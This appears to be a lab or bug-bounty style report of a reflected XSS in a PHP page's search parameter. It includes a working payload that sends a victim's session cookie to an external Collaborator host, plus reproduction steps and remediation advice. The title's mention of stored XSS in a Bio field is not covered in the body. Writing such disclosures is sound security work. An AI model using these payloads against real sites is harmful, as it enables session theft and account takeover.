## Title
Stored XSS in Bio field and Reflected XSS via Search Parameter Leads to Session Cookie Theft and Account Takeover

## Vulnerability Type
Stored and Reflected XSS

## Summary
The `search` parameter on `1601.php` reflects user input directly into an HTML attribute without any encoding. Breaking out of the attribute context with `">` and injecting an img tag with an onerror handler executes arbitrary JavaScript in the victim's browser. The session cookie `PHPSESSID` has no `HttpOnly` flag, so `document.cookie` reads it freely and sends it to an external server. Any logged-in user who clicks the crafted link loses their session.

## Vulnerable Endpoint
```
https://kzlabs.in/1601.php
```
**Vulnerable Parameter:** `search` (GET)

## Steps to Reproduce

1. Log in to the application at `https://kzlabs.in/1601.php` with a valid account.
2. Inject a test string into the `search` parameter and view page source to confirm it reflects raw inside the `value` attribute of the search input field.
3. Confirm JavaScript execution by visiting:
```
https://kzlabs.in/1601.php?search="><img src=x onerror=alert(1)>
```
4. Observe the alert box fires confirming the breakout and execution work.
5. Open DevTools → Application → Cookies and confirm `PHPSESSID` has no `HttpOnly` flag set.
6. Generate a Burp Collaborator payload and send the following URL to a logged-in session:
```
https://kzlabs.in/1601.php?search=%22%3E%3Cimg%20src%3Dx%20onerror%3D%22document.location%3D'https%3A%2F%2F5x3d22ofejxmnl3nakxm1vh7syytmka9.oastify.com%2F%3Fc%3D'%2Bdocument.cookie%22%3E
```
7. The `onerror` handler fires, reads the session cookie via `document.cookie`, and redirects the browser to the Collaborator server with the cookie value appended.
8. Poll Burp Collaborator and observe the incoming HTTP request carrying the full `PHPSESSID` value.

## Payload Used

**XSS confirmation:**
```
"><img src=x onerror=alert(1)>
```

**Cookie exfiltration:**
```
"><img src=x onerror="document.location='https://5x3d22ofejxmnl3nakxm1vh7syytmka9.oastify.com/?c='+document.cookie">
```

**URL-encoded form sent in browser:**
```
%22%3E%3Cimg%20src%3Dx%20onerror%3D%22document.location%3D'https%3A%2F%2F5x3d22ofejxmnl3nakxm1vh7syytmka9.oastify.com%2F%3Fc%3D'%2Bdocument.cookie%22%3E
```
## Proof of Concept

**Screenshot 1** — Alert box firing on `kzlabs.in/1601.php` with the `"><img` payload visible in the URL bar, confirming JavaScript execution via the onerror handler.

<img width="949" height="469" alt="image" src="https://github.com/user-attachments/assets/c4e457e5-e636-4a4c-bb1c-3baeac79c53b" />

**Screenshot 2** — DevTools Application tab showing `PHPSESSID` cookie with the `HttpOnly` column empty, confirming `document.cookie` exposes the session token to JavaScript.

<img width="955" height="466" alt="image" src="https://github.com/user-attachments/assets/b89f9d96-9d15-4e7b-a6ec-717900699823" />

<img width="1440" height="320" alt="image" src="https://github.com/user-attachments/assets/89ae2d08-e4fd-485a-aa63-c29b28e2a41e" />

**Screenshot 3** — Burp Collaborator showing the incoming HTTP request with `GET /?c=PHPSESSID=6n4shmca7jvh8ighmmfhdqsfa0` confirming the cookie was successfully exfiltrated from the victim's browser.

<img width="960" height="452" alt="image" src="https://github.com/user-attachments/assets/7b73d0be-d452-43c7-8713-f269c97152f1" />

## Impact

* Any logged-in user who visits the crafted URL has their session cookie sent directly to the attacker, giving full account access without needing credentials
* Since `HttpOnly` is not set on `PHPSESSID`, `document.cookie` exposes the token to JavaScript with no restrictions
* The attacker only needs to deliver the link once via email, chat, or any other channel — no interaction beyond clicking is required
  
## Remediation

* Pass all reflected user input through `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')` in PHP before rendering it into the page so characters like `"` and `>` cannot break out of attribute context
* Set the `HttpOnly` flag on the `PHPSESSID` cookie so JavaScript cannot read it even if XSS fires
* Add a `Content-Security-Policy` header that blocks inline event handlers and restricts script execution to trusted sources
